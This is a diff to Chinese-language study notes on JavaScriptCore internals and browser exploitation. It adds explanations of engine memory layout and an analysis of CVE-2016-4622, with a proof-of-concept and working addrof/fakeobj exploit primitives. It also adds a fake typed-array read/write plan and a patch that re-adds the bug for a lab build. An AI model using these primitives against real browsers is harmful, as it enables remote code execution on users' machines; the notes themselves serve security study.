@@ -1008,7 +1008,9 @@ int main(int argc, char **argv)
 
 
 
-### CVE-2016-4622 + JavascriptCore 內部機制
+### CVE-2016-4622 + CVE-2018-4233 + JavascriptCore 內部機制
+
+http://phrack.org/papers/attacking_javascript_engines.html
 
 #### env / background
 
@@ -1070,37 +1072,61 @@ Object: 0x10b9b4390 with butterfly 0x8000e0038 (Structure 0x10b9f2ae0:[Array, {}
 
 也能使用 `p *(JSC::JSObect*)` 印出對應 memory 其 `JSObject` 的架構
 
-而 JSC 會根據 array element 的不同，決定 array element 的型態，像是以下 case，連第一個 Int 也被轉成 Double：
 
-```
->>> describe([1337])
-Object: 0x10b9b43a0 with butterfly 0x8000dc010 (Structure 0x10b9f2c30:[Array, {}, CopyOnWriteArrayWithInt32, Proto:0x10b9c80a0, Leaf]), StructureID: 102
 
->>> describe([1337,13.37])
-Object: 0x10b9b43b0 with butterfly 0x8000dc030 (Structure 0x10b9f2ca0:[Array, {}, CopyOnWriteArrayWithDouble, Proto:0x10b9c80a0, Leaf]), StructureID: 103
-```
+JS engine 通常都包含：
 
-JavascriptCore 內部儲存資料的方式都是以 8 bytes 為單位，而對於不同 type 有不同的存法，參考 [JSCJSValue src](https://github.com/WebKit/webkit/blob/main/Source/JavaScriptCore/runtime/JSCJSValue.h)：
+- a **compiler infrastructure**, typically including at least one just-in-time (JIT) compiler
 
-```c
-     * The top 15-bits denote the type of the encoded JSValue:
-     *
-     *     Pointer {  0000:PPPP:PPPP:PPPP
-     *              / 0002:****:****:****
-     *     Double  {         ...
-     *              \ FFFC:****:****:****
-     *     Integer {  FFFE:0000:IIII:IIII
-     ...
-          * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean,
-     * null and undefined values are represented by specific, invalid pointer values:
-     *
-     *     False:     0x06
-     *     True:      0x07
-     *     Undefined: 0x0a
-     *     Null:      0x02
-```
+  - 會刪除一些 dispatching overhead，並且透過一些 speculation 來提昇效能，像是 "這個變數一定會是 number" (事實上是 dynamically typed)
 
-並且在儲存眾多資料時，有一個特別的儲存方法稱作 **Butterfly**，意即某個 object 指向某塊記憶體空間時，上下分別會儲存不同的資料，像是一個蝴蝶一樣：
+- a **VM** that operates on JavaScript values
+
+  - 包含可以直接執行 emitted bytecode 的 interpreter，而通常又是 stack-based VM，以下為 JSC 的 sample code：
+
+    ```c
+        CASE(JSOP_ADD)
+        {
+            MutableHandleValue lval = REGS.stackHandleAt(-2);
+            MutableHandleValue rval = REGS.stackHandleAt(-1);
+            MutableHandleValue res = REGS.stackHandleAt(-2);
+            if (!AddOperation(cx, lval, rval, res))
+                goto error;
+            REGS.sp--;
+        }
+        END_CASE(JSOP_ADD)
+    ```
+
+    
+
+- a **runtime** that provides a set of builtin objects and functions
+
+
+
+JS 為 **prototype-based-inheritance** - object 會 ref 到一個 prototype object，該 prototype object 會記錄他的 properties
+
+JS engine 對於資料的儲存基本上不超過 8 bytes，舉例來說：
+
+- v8 儲存 value 與 pointer 的差別為 LSB 是否為 1 (tagged)，為 1 的話則是 pointer
+
+- JSC 以及 spidermokey (firefox) 用 NaN-boxing，利用不同 primitive 的 bit 會代表著對應 primitive 使否為 NaN，將那些 bit 作為 encoding 的機制，並且有些 primitive 是用 magic number 來代表，參考 [JSCJSValue src](https://github.com/WebKit/webkit/blob/main/Source/JavaScriptCore/runtime/JSCJSValue.h)：
+
+  ```c
+      *     Pointer {  0000:PPPP:PPPP:PPPP
+      *              / 0001:****:****:****
+      *     Double  {         ...
+      *              \ FFFE:****:****:****
+      *     Integer {  FFFF:0000:IIII:IIII
+      
+      *     False:     0x06
+      *     True:      0x07
+      *     Undefined: 0x0a
+      *     Null:      0x02
+  ```
+
+object 會將 properties 存成 pair 的形式 (key, value)，而 array 可以說是一種 exotic object，property name 為 32-bit integer 的 object，同時 property 也是 element。
+
+JSC 會將 properties 跟 elements 存在同個 memory region，並用 **Butterfly** 的方式存，使用 **Butterfly** 的 pointer 實際上只到的是 memory region 的中間，而左邊 (上面) 是放 element vector 的 length 以及 property，右邊 (下面) 是放 element，意即某個 object 指向某塊記憶體空間時，上下分別會儲存不同的資料，像是一個蝴蝶一樣：
 
 ```
 --------------------------------------------------------
@@ -1117,6 +1143,14 @@ JavascriptCore 內部儲存資料的方式都是以 8 bytes 為單位，而對�
 
 - array element 會被存在 pointer 的下面
 - array length 以及 property 會被存在前面
+
+用來表示 array type 的 cell_header 分成許多種，包含但不限於以下的例子:
+
+```c
+    ArrayWithInt32      = IsArray | Int32Shape;
+    ArrayWithDouble     = IsArray | DoubleShape;
+    ArrayWithContiguous = IsArray | ContiguousShape;
+```
 
 而 property 也有可能直接存在 `Object` 底下 `0xbadbeef0` 的部分 (inline object)，但是在超過一定大小 (6) 後還是會把多的 element 用 butterfly 來存，不過此時 Object 仍然有東西 (1~6 的 element value)。有關儲存方式更詳細的 layout：
 
@@ -1157,6 +1191,48 @@ JavascriptCore 內部儲存資料的方式都是以 8 bytes 為單位，而對�
         |     baz : 2       |
         |                   |
         +-------------------+
+```
+
+- structureID 會從 structure table 找對應的 structure，這樣就可以知道 property 的數量與結構
+
+
+
+當執行 JS 的 function 時，`arguments` 以及 `this` 兩個變數變的可以使用：
+
+- `arguments` - 可以讓我們存取到 function 的 arguments
+- `this` - 當 function 呼叫 constructor (`new func()`)，`this` 會指向被新建的 function object 本身
+  - 但如果 function 是被 object 呼叫 (`obj.func()`)，`this` 則會指向 reference object
+
+其中 function 有 `.call` 以及 `.apply` 兩個特別的 property，可以吃指定的 `this` (function object) 以及 `arguments` 並做呼叫，不過不確定有什麼功能。built-in function 通常不是 **C++** native function 就是 Javascript function，以 `Math.pow()` 來說：
+
+```js
+    EncodedJSValue JSC_HOST_CALL mathProtoFuncPow(ExecState* exec)
+    {
+        // ECMA 15.8.2.1.13
+
+        double arg = exec->argument(0).toNumber(exec);
+        double arg2 = exec->argument(1).toNumber(exec);
+
+        return JSValue::encode(JSValue(operationMathPow(arg, arg2)));
+    }
+```
+
+- JS function 的 signature -  `ECMA 15.8.2.1.13`
+- argument 是怎麼被 extract 的 -  `argument()`
+- arguemtn 是如何做 type convertion - `toNumber()`
+- `mathProtoFuncPow()` 實際上是做了哪些事
+- 回傳的結果 - `JSValue::encode()` 過的 value
+
+
+
+ JSC 會根據 array element 的不同，決定 array element 的型態，像是以下 case，連第一個 Int 也被轉成 Double：
+
+```
+>>> describe([1337])
+Object: 0x10b9b43a0 with butterfly 0x8000dc010 (Structure 0x10b9f2c30:[Array, {}, CopyOnWriteArrayWithInt32, Proto:0x10b9c80a0, Leaf]), StructureID: 102
+
+>>> describe([1337,13.37])
+Object: 0x10b9b43b0 with butterfly 0x8000dc030 (Structure 0x10b9f2ca0:[Array, {}, CopyOnWriteArrayWithDouble, Proto:0x10b9c80a0, Leaf]), StructureID: 103
 ```
 
 JSC 的 JIT 分成多個不同層級：
@@ -1268,11 +1344,457 @@ JIT 的過程：
 
 如果可以在動態改變 object layout，就能造成 type confusion 並且做到 information leak，而開發者的對應方式為：如果該 function 會在動態更新 object，會被 marked 成 dangerous：`clobberWorld()`。
 
-- 像是 `String.ValueOf()` 可能會更改 structure，就是 dangerous (returns the **primitive value of the specified object**)
+- 像是 `String.valueOf()` 可能會更改 structure，就是 dangerous (returns the **primitive value of the specified object**)
+
+GC 的機制有許多種，其中一個是 maintain reference counter，而大多數的 JS engine 都是用 **mark and sweep algorithm** 來實踐 GC，從 root node 開始搜，陸續 free 已經不需要的 object，而 root node 通常存在於 stack，並且有著如 `windows` 那樣的全域 object。
+
+不過 JSC 並沒有一直 track root node，而是直接在 stack 搜尋像 pointer value 的東西，並且將他當作 root node，相較之下 SpiderMonkey 就是用 `Rooted<>` 的 pointer class 指向在 heap 的 object。並且 JSC 的 GC 為 incremental garbage collector，分成不同的 step 做 mark 來減少延遲，但是這樣的方式可能有一些 case 會出現問題：
+
+- the GC runs and visits some **object O** and **all its referenced objects**. It marks them as **visited** and later **pauses** so the application can run again
+- O is **modified** and **a new reference to another Object P** is added to it
+- Then the GC runs **again** but it doesn't know about P. It finishes the marking phase and frees the memory of P
+
+所以在 implementation 時會用到一些 write barrier 來確保資料同步。
+
+而 JSC 又用到兩種不同的 GC (?)：
+
+- moving garbage collector - moves **live objects** to a **different location** and updates all pointers to these objects
+  - 在要刪除點時不需要把 node 放到 free_list，因此減少 runtime overhead
+- non-moving garbage collector
+- JSC 儲存 JavaScript objects itself 以及一些 objects 到 a non-moving heap，而 non-moving 為 marked space，用來儲存 butterflies 以及作為在 moving heap array 的 copied space
 
 
 
-#### exploit
+marked space / copied space
+
+- marked space - a collection of memory blocks that **keep track of the allocated cells**
+
+  - 在 JSC，object in marked space 都是 **inherit from the JSCell class**，並且 starts with an **eight byte header**，header 當中包含了當前 GC 要使用的 cell state，而 GC 會用這個來追蹤 JSCell 是否 visited
+
+  - 還有一個值得注意的是，JSC 在每個 marked block 開頭都會有一個 `MarkedBlock` instance：
+
+    ```js
+    inline MarkedBlock* MarkedBlock::blockFor(const void* p)
+    {
+    	return reinterpret_cast<MarkedBlock*>(
+    				reinterpret_cast<Bits>(p) & blockMask);
+    }
+    ```
+
+    - instance 當中有一個 pointer 指向 owning Heap，以及一個 pointer 指向 VM instance，可以讓 engine 知道是否在當前的 context 可以使用
+      - 而這個機制讓 fake object 不好建立，因為合法的 MarkedBlock instance 必須做到一些操作，因此該 object 並不是 fake object 的首選目標
+
+- copied space - 儲存與 marked space 內有關聯的 memory buffers，通常是 butterflies，不過 typed array 的內容也會放在這，因此 OOB 有可能在該 memory region 發生
+
+  - copied space allocator:
+
+    ```js
+    CheckedBoolean CopiedAllocator::tryAllocate(size_t bytes, void** out)
+        {
+          ASSERT(is8ByteAligned(reinterpret_cast<void*>(bytes)));
+    
+          size_t currentRemaining = m_currentRemaining;
+          if (bytes > currentRemaining)
+            return false;
+          currentRemaining -= bytes;
+          m_currentRemaining = currentRemaining;
+          *out = m_currentPayloadEnd - currentRemaining - bytes;
+    
+          ASSERT(is8ByteAligned(*out));
+    
+          return true;
+        }
+    ```
+
+    - 同時這也是一個 bump allocator - 單純的回傳 N bytes in the current block，直到下個 block 的空間被用完，而這也保證兩個連續的 allocation 會是相鄰的，因此在擁有 oob 的情況下，對我們來說是個好目標
+
+
+
+#### CVE-2016-4622 analyze / exploit
+
+**環境**
+
+作法一：
+
+1. `git clone https://github.com/hdbreaker/WebKit-CVE-2016-4622.git`
+2. disable **System Integrity Protection** 才能 `export DYLD_FRAMEWORK_PATH=$(pwd)`，不然 `DYLD` 的 env 都會被 ignore
+3. 失敗 (環境為 Big Sur 11.5.2)，不知道為什麼吃不到 FRAMEWORK，或者是 FRAMEWORK 是壞的
+
+作法二 (參考 https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622，環境為 ubuntu 18.04)：
+
+1. `git clone git://git.webkit.org/WebKit.git WebKit`
+
+   - 這邊踩到一個雷，直接在 github 上搜的 mirror  不是用 `git.webkit.org` ，因此如果直接 `git clone git@github.com:WebKit/WebKit.git` 不能切換到其他 branch
+
+2. `git checkout 3d9b9ba1f3341456661952128224aa3a3f27ae55`
+
+3. `git apply vuln.patch`，`vuln.patch` 內容如下：
+
+   ```diff
+   diff --git a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
+   index c37389aa857..f77821c89ae 100644
+   --- a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
+   +++ b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
+   @@ -973,7 +973,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
+        if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
+            return { };
+    
+   -    bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj) && length == toLength(exec, thisObj);
+   +    bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj);
+        RETURN_IF_EXCEPTION(scope, { });
+        if (LIKELY(okToDoFastPath)) {
+            if (JSArray* result = asArray(thisObj)->fastSlice(*exec, begin, end - begin))
+   diff --git a/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp b/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp
+   index e19c8a92a4e..550bc2fe270 100644
+   --- a/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp
+   +++ b/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp
+   @@ -44,7 +44,7 @@ ObjectInitializationScope::~ObjectInitializationScope()
+    {
+        if (!m_object)
+            return;
+   -    verifyPropertiesAreInitialized(m_object);
+   +    //verifyPropertiesAreInitialized(m_object);
+    }
+    
+    void ObjectInitializationScope::notifyAllocated(JSObject* object, bool wasCreatedUninitialized)
+   ```
+
+4. `Tools/Scripts/build-jsc --jsc-only --debug ` (macOS 16GB i7 4 core 跑在 ubuntu18.04 docker 要跑三個鐘頭)
+
+5. 失敗 again
+
+
+
+`slice()` 的使用方式
+
+```js
+    var a = [1, 2, 3, 4];
+    var s = a.slice(1, 3);
+    // s now contains [2, 3]
+```
+
+
+
+而 `slice()`  是由 `arrayProtoFuncSlice()` implement
+
+```js
+EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
+    {
+      /* [[ 1 ]] */
+      JSObject* thisObj = exec->thisValue()
+                         .toThis(exec, StrictMode)
+                         .toObject(exec);
+      if (!thisObj)
+        return JSValue::encode(JSValue());
+
+      /* [[ 2 ]] */
+      unsigned length = getLength(exec, thisObj);
+      if (exec->hadException())
+        return JSValue::encode(jsUndefined());
+
+      /* [[ 3 ]] */
+      unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);
+      unsigned end =
+          argumentClampedIndexFromStartOrEnd(exec, 1, length, length);
+
+      /* [[ 4 ]] */
+      std::pair<SpeciesConstructResult, JSObject*> speciesResult =
+        speciesConstructArray(exec, thisObj, end - begin);
+      // We can only get an exception if we call some user function.
+      if (UNLIKELY(speciesResult.first ==
+      SpeciesConstructResult::Exception))
+        return JSValue::encode(jsUndefined());
+
+      /* [[ 5 ]] */
+      if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &&
+            isJSArray(thisObj))) {
+        if (JSArray* result =
+                asArray(thisObj)->fastSlice(*exec, begin, end - begin))
+          return JSValue::encode(result);
+      }
+
+      JSObject* result;
+      if (speciesResult.first == SpeciesConstructResult::CreatedObject)
+        result = speciesResult.second;
+      else
+        result = constructEmptyArray(exec, nullptr, end - begin);
+
+      unsigned n = 0;
+      for (unsigned k = begin; k < end; k++, n++) {
+        // n == index
+        JSValue v = getProperty(exec, thisObj, k);
+        if (exec->hadException())
+          return JSValue::encode(jsUndefined());
+        if (v)
+          result->putDirectIndex(exec, n, v);
+      }
+      setLength(exec, result, n);
+      return JSValue::encode(result);
+    }
+```
+
+1. Obtain the reference object for the method call (this will be the array object)
+   - 取得 object 的 reference ( 也就是 `array` ) - `thisObj`
+2. Retrieve the length of the array
+   - 取得 array 長度 - `getLength(exec, thisObj)`
+3. Convert the arguments (start and end index) into native integer types and clamp them to the range [0, length)
+   - 找到 slice 的 start 以及 end，並且要侷限在 `[0, length)`
+4. Check if a species constructor should be used
+   - 看有沒有用 species constructor
+   - `Symbol.species` - specifies a function-valued property that the constructor function uses to create derived objects
+5. Perform the slicing
+   - 執行 slice，一共有兩種方式
+     - array 為 native array (`isJSArray(thisObj)`) with dense storage，走  `fastSlice(*exec, begin, end - begin))`
+       - 只是用 `memcpy()` 將給定的 index 以及 length copy 到 new array
+     - 另一個就是一個個將 element 丟到
+
+- 看起來 begin 跟 end 會在 array 的範圍當中 (長度)
+
+
+
+正常情況下，如果 object 有 define `valueOf()` function 的話，當要存取該 object 所代表的 number 時，就會直接呼叫該 function。而當我們深入研究 `arrayProtoFuncSlice()` 所執行到的  `argumentClampedIndexFromStartOrEnd()`：
+
+```js
+    JSValue value = exec->argument(argument);
+    if (value.isUndefined())
+        return undefinedValue;
+
+    double indexDouble = value.toInteger(exec);  // Conversion happens here
+    if (indexDouble < 0) {
+        indexDouble += length;
+        return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);
+    }
+    return indexDouble > length ? length :
+                                  static_cast<unsigned>(indexDouble);
+```
+
+會在 `toInteger()` 時間接呼叫 `valueOf()`，但是如果在 `valueOf()` 的過程中發生 array length 的改變，則會在之後造成 out-of-bounds (OOB) 的存取，並且會透過 `memcpy()` 回傳給 user。
+
+於是如果要確保我們可以成功 resize array，可以先看一下 `.length` 是如何實踐的 (`JSArray::setLength:`)：
+
+```js
+unsigned lengthToClear = butterfly->publicLength() - newLength;
+unsigned costToAllocateNewButterfly = 64; // a heuristic.
+if (lengthToClear > newLength &&
+    lengthToClear > costToAllocateNewButterfly) {
+    reallocateAndShrinkButterfly(exec->vm(), newLength);
+    return true;
+}
+```
+
+- heuristic 分配 butterfly 大小，避免太長重新分配
+- 如果要清除的空間 > 新的空間，且同時 `> 64`，這樣就會需要 shrink array，造成我們可以做 OOB 存取 (原變數的長度並沒有更新)
+
+POC:
+
+```js
+var a = [];
+// 增加 array 的大小
+for (var i = 0; i < 100; i++)
+    a.push(i + 0.123);
+
+// 100 > 0 且 100 > 64 -> reallocate
+var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});
+// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]
+```
+
+正確的情況應該是 `undefined` * 10，不過卻會回傳 double value
+
+
+
+**addrof**
+
+似乎 JSC 的打法都是想辦法讓 `ArrayWithDouble` 的 array 但是被 engine 認成 `ArrayWithContiguous`。
+
+建構 `addrof` 需要幾個步驟：
+
+1. Create an array of doubles. This will be stored internally as IndexingType `ArrayWithDouble`
+2. **shrink** the previously created array
+   1. **allocate a new array** containing just the object whose address we wish to know
+      - This array will (most likely) be placed right behind the new butterfly since it's located in copied space
+   2. return a value **larger than the new size** of the array to trigger the bug
+3. Call slice() on the target array the object from step 2 as **one of the arguments**
+
+```js
+    function addrof(object) {
+        var a = [];
+        // 建立有 100 elements 的 double array [1]
+        for (var i = 0; i < 100; i++)
+            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles
+	
+        // [2.1] 在 valueOf 當中先轉變大小為 0，並且在 create 新的 array，
+        // 新 array 的 element 為我們的 target， // type 為 ArrayWithContiguous ?
+        // 最後回傳大於 1 (new size) 的數字 [2.2]
+        var hax = {valueOf: function() {
+            a.length = 0;
+            a = [object]; // 建立的 array 因為先前的 array 大小被改成 0，
+            // 因此會緊接在先前的 array 後面
+            return 4;
+        }};
+
+        // shrink array [2]
+        // hax 為其中一個 argument [3]
+        var b = a.slice(0, hax); // (0, 4) 但是
+        return Int64.fromDouble(b[3]);
+    }
+```
+
+
+
+**fakeobj**
+
+大概分成幾個步驟：
+
+1. Create an **array of objects**. This will be stored internally as IndexingType **ArrayWithContiguous**
+2. Set up an **object** with a custom `valueOf` function which will
+   1. shrink the previously created array
+   2. allocate a **new array** containing **just a double** whose bit pattern matches the address of the **JSObject we wish to inject**
+      - The double will be stored in native form since the array's IndexingType will be `ArrayWithDouble`
+3. Call `slice()` on the target array the object from step 2 as one of the arguments
+
+```js
+function fakeobj(addr) {
+    var a = [];
+    // [1] 由於 element 都是 object，因此 new array type 為 ArrayWithContiguous
+    for (var i = 0; i < 100; i++)
+        a.push({});     // Array must be of type ArrayWithContiguous
+
+    // 將 target address 轉為 double
+    addr = addr.asDouble();
+    var hax = {valueOf: function() {
+        a.length = 0; // [2.1] shrink 先前的 array
+        a = [addr]; // [2.2] 建立新的 array，並且 element 只有我們的 target
+        // 而該 array 的 type 會是 ArrayWithDouble
+        return 4;
+    }};
+
+    // a.slice(0, 4)[3] 會回傳 object (因為 ArrayWithContiguous)
+    // 但是該 object address 會是我們控制的 address
+    return a.slice(0, hax)[3];
+}
+```
+
+
+
+然而有了 `addrof` 與 `fakeobj` 後，開始構思 exploit：
+
+- 建構怎樣的 object
+  - JS 提供高效能以及高度優化的 typed array (也代表檢查較少)，而其中有 data pointer 可以控制做 arbitrary r/w，因此是個好對象，最後決定建構 fake `Float64Array` object
+- 怎麼建構
+- 建構的 object 要在哪
+
+回顧一下 JSObject system：
+
+- JSObject inline storage 預設有 6 個 slot，在大於 6 個後就會放到 butterfly 當中
+
+- 前 8 bytes 是 JSCell，存：
+
+  - **StructureID m_structureID** - This is the most interesting one, we'll explore it further below
+  - **IndexingType m_indexingType** - We've already seen this before. It indicates the **storage mode of the object's elements**
+  - **JSType m_type** -  Stores the type of this cell: **string**, **symbol**, **function**, **plain object**, ...
+
+  - **TypeInfo::InlineTypeFlags m_flags** - Flags that aren't too important for our purposes
+    - JSTypeInfo.h contains further information
+  - **CellState m_cellState** - We've also seen this before. It is used by the **gc** during collection
+
+- structure 並不是存成 pointer，而是透過 structureID，並且在新增 properties 時會將新的 structure cache 在前個 structure 當中，再透過 transition table 來存取，這樣做能避免掉每新增一個 protperty 就要新增一個 Structure
+
+  - 大多數的 JS engine 也是使用相同概念，而 structure 在 v8 稱作 maps or hidden classes；Spidermonkey 稱作 shape
+
+  - structure ID 對 JIT optimize 也有很大的效果，舉例來說：
+
+    ```js
+    function foo(a) {
+        return a.bar + 3;
+    }
+    ```
+
+    JIT 後若要知道他的 object 是否有 property `a`，以及他的 `a` 的 type 是否為數字，只需要判斷 structure ID 是不是在 JIT 過程中一直被傳入的 structure 即可：
+
+    ```asm
+    mov r1, [r0 + #structure_id_offset];
+    cmp r1, #structure_id;
+    jne bailout_to_interpreter;
+    mov r2, [r0 + #inline_property_offset];
+    ```
+
+  - 不過 structure ID 比較難做 predict，fake object 的 structure ID 必須透過 for loop 的方式來找是否為要構造的 structure ID，像是：
+
+    ```js
+        for (var i = 0; i < 0x1000; i++) {
+            var a = new Float64Array(1);
+            // Add a new property to create a new Structure instance.
+            a[randomString()] = 1337;
+        }
+    ```
+
+    會有許多 structure ID，如果要找到指定的，就用 `instanceof()` 來找：
+
+    ```js
+    while (!(fakearray instanceof Float64Array)) {
+        // Increment structure ID by one here
+    }
+    ```
+
+    `instanceof()` 只是單純去比對 structure prototype (maybe 直接找 structure ID ?)，並不會影響到 memory layout
+
+
+
+**exploit**
+
+`Float64Arrays` 由 `JSArrayBufferView` class 所 implement，除了基本的 JSObject 還包含 pointer to backing memory (稱作 `vector`)。而因為我們把 `Float64Arrays` 放在 inline slot，因此要 handle 一些 JSValue encoding 的限制
+
+- 不能有 `nullptr` (0)，因為 `nullptr` 在 encode 後由其他 value 表示
+- 因為用 `NaN-boxing`，所以不能設 valid mode field (必須要大於 `0x00010000 `?)
+- can only set the vector to point to another JSObject since these are
+        the only pointers that a JSValue can contain
+- `JSValue` 的 `vector` 只能指向設其他 JSObject
+  - `CagedPtr<Gigacage::Primitive, void, tagCagedPtr>` 會檢查 `vector` 指向的區域是否為合法，但是 butterfly 不會
+
+
+
+改變 `vector` 指向另一個 `Uint8Array`，而此時就可以透過第二個 object 來改變 `butterfly`，做到 arbitrary r/w
+
+```
++----------------+                  +----------------+
+|  Float64Array  |   +------------->|  Uint8Array    |
+|                |   |              |                |
+|  JSCell        |   |              |  JSCell        |
+|  butterfly     |   |              |  butterfly     |
+|  vector  ------+---+              |  vector        |
+|  length        |                  |  length        |
+|  mode          |                  |  mode          |
++----------------+                  +----------------+
+```
+
+
+
+當可以任意寫，可以構造一個 `makeJITCompiledFunction()`，取得 function address，並且將內容寫成 shellcode，不過從 iOS 10 開始，JIT 的 memory region 就不是 RWX 而是 --X，因此可能會需要串一些 ROP 改變 memory region 的 permission。
+
+
+
+**stay alive past gc**
+
+如果要在 exploit 結束後讓 render 能正常 work，就必須處理我們建構的 fakeobj `Float64Array` 其 `butterfly` 是 invalid pointer 的情況
+
+1. Create an empty object. The structure of this object will describe
+       an object with the default amount of inline storage (6 slots), but
+       none of them being used.
+
+    2. Copy the JSCell header (containing the structure ID) to the
+       container object. We've now caused the engine to "forget" about the
+       properties of the container object that make up our fake array.
+
+    3. Set the butterfly pointer of the fake array to nullptr, and, while
+       we're at it also replace the JSCell of that object with one from a
+       default Float64Array instance
+
+The last step is required since we might end up with the structure of a
+Float64Array with some property due to our structure spraying before.
+
+
+
+#### CVE-2018-4233 (WebKit-RegEx-Exploit) analyze / isexploit
 
 `addrof`：
 
@@ -1817,3 +2339,18 @@ write64 = function(where, what) {
 - [saelo's exploit for CVE-2018-4233](https://github.com/saelo/cve-2018-4233)
   - another implementation by Niklas B - [regexp](https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html)
 - [Zero Day Initiative](https://twitter.com/thezdi) - [blog post](https://www.zerodayinitiative.com/blog/2019/3/14/the-apple-bug-that-fell-near-the-webkit-tree)
+
+CVE 分析：
+
+- [CVE-2016-4622](https://zhuanlan.zhihu.com/p/127115854)
+
+
+
+
+
+### V8 & CVE-2018-17463
+
+http://phrack.org/papers/jit_exploitation.html
+
+
+
